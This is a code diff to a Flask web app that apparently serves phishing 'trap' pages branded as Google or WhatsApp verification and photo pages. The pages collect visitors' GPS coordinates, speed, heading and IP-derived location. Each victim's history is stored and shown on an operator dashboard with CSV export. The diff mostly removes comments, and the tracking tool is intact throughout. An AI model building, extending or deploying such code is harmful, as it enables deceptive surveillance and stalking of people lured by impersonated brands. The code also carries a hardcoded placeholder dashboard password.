@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template, jsonify, session, redirect, url_for
+from flask import Flask, request, render_template, jsonify, session, redirect, url_for, Response  # <-- Response added here
 from flask_cors import CORS
 import os
 import secrets
@@ -6,17 +6,16 @@ import requests
 from datetime import datetime
 
 app = Flask(__name__)
-app.secret_key = secrets.token_hex(16)  # For dashboard auth
+app.secret_key = secrets.token_hex(16)
 CORS(app)
 
 # =============================================
-# DATA STORAGE — Multi-User Support
+# DATA STORAGE
 # =============================================
 
-users = {}  # { session_id: { "current": {...}, "history": [...] } }
+users = {}
 all_history = []
 
-# Fallback location (for backward compatibility)
 latest_location = {
     "lat": None, "lng": None, "accuracy": None,
     "altitude": None, "heading": None, "speed": None,
@@ -30,7 +29,6 @@ latest_location = {
 # =============================================
 
 def get_ip_info(ip):
-    """Fetch city, country, ISP from ip-api.com (free, no API key required)"""
     try:
         url = f'http://ip-api.com/json/{ip}?fields=status,country,city,isp,lat,lon'
         response = requests.get(url, timeout=5)
@@ -51,7 +49,6 @@ def get_ip_info(ip):
 # ROUTES
 # =============================================
 
-# --- Clean URL Routes ---
 @app.route('/<brand>/verify')
 def verify_trap_clean(brand):
     return render_template('index.html', brand=brand)
@@ -60,7 +57,6 @@ def verify_trap_clean(brand):
 def photo_trap_clean(brand):
     return render_template('photo.html', brand=brand)
 
-# --- Legacy Routes (backward compatibility) ---
 @app.route('/')
 def target_page():
     template = request.args.get('template', 'google')
@@ -71,7 +67,7 @@ def photo_trap():
     template = request.args.get('template', 'whatsapp')
     return render_template('photo.html', brand=None)
 
-# --- Dashboard (with password protection) ---
+# --- DASHBOARD AUTH ---
 DASHBOARD_PASSWORD = "your_strong_password"  # CHANGE THIS!
 
 @app.route('/dashboard-login', methods=['GET', 'POST'])
@@ -95,7 +91,7 @@ def dashboard():
         return redirect(url_for('dashboard_login'))
     return render_template('dashboard.html')
 
-# --- API Endpoints ---
+# --- API ENDPOINTS ---
 @app.route('/send-location', methods=['POST'])
 def receive_location():
     global users, all_history, latest_location
@@ -106,11 +102,9 @@ def receive_location():
     if not session_id:
         session_id = request.remote_addr or 'unknown'
     
-    # Get real client IP (Render uses X-Forwarded-For)
     forwarded = request.headers.get('X-Forwarded-For')
     client_ip = forwarded.split(',')[0].strip() if forwarded else request.remote_addr
     
-    # Fetch IP info
     ip_info = get_ip_info(client_ip)
     
     location_data = {
@@ -125,7 +119,6 @@ def receive_location():
         "network": data.get('network'),
         "timestamp": datetime.now().isoformat(),
         "session_id": session_id,
-        # --- IP fields ---
         "ip": client_ip,
         "ip_city": ip_info.get('city') if ip_info else None,
         "ip_country": ip_info.get('country') if ip_info else None,
@@ -134,7 +127,6 @@ def receive_location():
         "ip_lon": ip_info.get('lon') if ip_info else None
     }
 
-    # Store per user
     if session_id not in users:
         users[session_id] = {"current": location_data, "history": []}
     else:
@@ -144,15 +136,13 @@ def receive_location():
     if len(users[session_id]["history"]) > 50:
         users[session_id]["history"] = users[session_id]["history"][-50:]
 
-    # Store in global history
     all_history.append(location_data)
     if len(all_history) > 200:
         all_history = all_history[-200:]
 
-    # Update fallback
     latest_location = location_data
 
-    print(f"📍 Location from {session_id} (IP: {client_ip}): {location_data}")
+    print(f"📍 Location from {session_id} (IP: {client_ip})")
     print(f"👥 Total users: {len(users)}")
 
     return jsonify({"status": "ok", "session_id": session_id})
@@ -215,7 +205,7 @@ def clear_location():
     }
     return jsonify({"status": "cleared"})
 
-# --- CSV Export (Bonus) ---
+# --- CSV EXPORT (FIXED) ---
 @app.route('/export-csv')
 def export_csv():
     global all_history
